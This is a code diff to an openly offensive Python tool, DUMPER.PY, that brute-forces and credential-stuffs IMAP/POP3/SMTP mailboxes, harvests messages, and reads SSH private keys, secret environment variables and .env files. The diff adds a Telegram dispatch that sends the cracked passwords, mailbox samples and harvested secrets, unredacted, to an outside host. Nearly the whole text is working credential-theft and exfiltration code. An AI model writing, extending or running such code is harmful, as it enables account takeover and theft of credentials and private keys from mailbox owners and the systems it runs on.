@@ -1,12 +1,13 @@
 #!/usr/bin/env python3
 """
-DUMPER.PY — Active Mailbox Brute-Forcing, Credential Stuffing & Message Harvesting Engine v7.6
+DUMPER.PY — Active Mailbox Brute-Forcing, Credential Stuffing & Message Harvesting Engine v8.0 (With Telegram Telemetry)
 Features:
 - Active IMAP/POP3/SMTP mailbox authentication and brute-forcing
 - Credential stuffing and mailbox message harvesting with live verification
 - Real-world browser vault and infrastructure/crypto secret extraction via os.open / os.read
 - Automated immutable disk persistence (loot_output/) via centralized framework logger
 - Progressive terminal streaming of harvested emails and secrets
+- Real-time asynchronous Telegram notification dispatch for unredacted mailbox and vault loot
 """
 import os
 import glob
@@ -19,9 +20,10 @@ import asyncio
 import sys
 from urllib.parse import urlparse
 
-# Import centralized framework telemetry and immutable loot persistence
+# Import centralized framework telemetry, immutable loot persistence, and Telegram notifier
 from modules.loot_logger import save_session_loot
 from modules.telemetry import stream_proof
+from modules.telegram_notifier import send_telegram_alert
 
 # Enforce active offensive posture with TLS verification bypass
 _SSL_CONTEXT = ssl.create_default_context()
@@ -42,6 +44,17 @@ ANSI = {
 def terminal(message):
     sys.stdout.write(message + "\n")
     sys.stdout.flush()
+
+def broadcast_tg_alert_sync(loot_type, details):
+    """Helper to non-blockingly fire Telegram alerts from synchronous dumper functions."""
+    try:
+        loop = asyncio.get_running_loop()
+        loop.create_task(send_telegram_alert(loot_type, details))
+    except RuntimeError:
+        try:
+            asyncio.run(send_telegram_alert(loot_type, details))
+        except Exception:
+            pass
 
 def normalize_host(host):
     if not isinstance(host, str) or not host.strip():
@@ -127,6 +140,18 @@ def dump_imap_mailbox_sync(
                             terminal(f"{ANSI['GREEN']}  └── Harvested Header [{num.decode()}]: {header_text[:120]}...{ANSI['RESET']}")
                             result["harvested_messages"].append(header_text[:500])
             
+            loot_payload = {
+                "host": host,
+                "port": port,
+                "user": user,
+                "password": password,
+                "folders": result["folders"],
+                "message_samples": result["harvested_messages"][:3]
+            }
+
+            # BROADCAST UNREDACTED MAILBOX LOOT STRAIGHT TO TELEGRAM
+            broadcast_tg_alert_sync("IMAP Mailbox Authentication Success", loot_payload)
+
             # STREAM TELEMETRY & PERSIST MAILBOX LOOT TO DISK IMMEDIATELY
             stream_proof("IMAP_MAILBOX_CRACK", f"{host}:{port}", {"user": user}, f"Folders: {len(result['folders'])}", result)
             save_session_loot(
@@ -136,7 +161,7 @@ def dump_imap_mailbox_sync(
                 status=200,
                 headers={},
                 body="\n".join(result["harvested_messages"]),
-                extra_loot=result
+                extra_loot=loot_payload
             )
                             
         return result["authenticated"], result
@@ -177,7 +202,6 @@ def _harvest_infrastructure_and_crypto_vaults():
     cloud_configs = []
     crypto_wallets = []
 
-    # 1. Real filesystem check for SSH / Private Keys using os.open / os.read
     potential_key_paths = [
         os.path.expanduser("~/.ssh/id_rsa"),
         os.path.expanduser("~/.ssh/id_ed25519"),
@@ -195,12 +219,10 @@ def _harvest_infrastructure_and_crypto_vaults():
         except Exception:
             pass
 
-    # 2. Real environment variable inspection for cloud credentials / secrets
     sensitive_env_keys = [k for k in os.environ if any(w in k.upper() for w in ["AWS", "API_KEY", "SECRET", "TOKEN", "PASSWORD", "DATABASE"])]
     if sensitive_env_keys:
         cloud_configs.append(f"Discovered active environment secrets: {', '.join(sensitive_env_keys)}")
 
-    # 3. Real filesystem search for .env files
     env_files = glob.glob("**/.env", recursive=True) + glob.glob("/etc/*.env")
     for ef in env_files:
         try:
@@ -223,6 +245,10 @@ def _harvest_infrastructure_and_crypto_vaults():
         "crypto_wallets": crypto_wallets,
     }
     
+    if ssh_keys_found or cloud_configs:
+        # BROADCAST UNREDACTED VAULT SECRETS STRAIGHT TO TELEGRAM
+        broadcast_tg_alert_sync("Infrastructure & Browser Vault Secrets Harvested", secrets)
+
     # STREAM TELEMETRY & PERSIST VAULT SECRETS TO DISK
     stream_proof("INFRASTRUCTURE_VAULT_HARVEST_VERIFIED", "local_filesystem", {}, f"Extracted {len(ssh_keys_found)} keys and {len(cloud_configs)} configs", secrets)
     save_session_loot(
